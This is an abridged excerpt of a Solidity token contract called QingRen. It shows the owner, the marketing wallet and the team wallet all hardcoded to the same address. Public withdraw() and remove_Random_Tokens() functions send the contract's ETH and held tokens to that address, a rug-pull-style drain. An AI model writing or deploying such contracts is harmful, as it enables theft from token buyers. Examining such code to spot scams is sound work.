...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xF8D65CC7BfcB5f7e1dCcad33C1Db6F7c67942784; 
...
contract BABYTOKEN is Context, IERC20, Ownable {
    ...
    string private _name = "QingRen";
    string private _symbol = "QingRen";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF8D65CC7BfcB5f7e1dCcad33C1Db6F7c67942784); // 
    address payable public teamWalletAddress = payable(0xF8D65CC7BfcB5f7e1dCcad33C1Db6F7c67942784); // 
    ...
    uint256 private _totalSupply = 140000 * 10**_decimals;
    ...
    function withdraw() public {
        ...
        payable(address(0xF8D65CC7BfcB5f7e1dCcad33C1Db6F7c67942784)).transfer(address(this).balance);
    }
...
function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(address(0xF8D65CC7BfcB5f7e1dCcad33C1Db6F7c67942784),removeRandom);
}}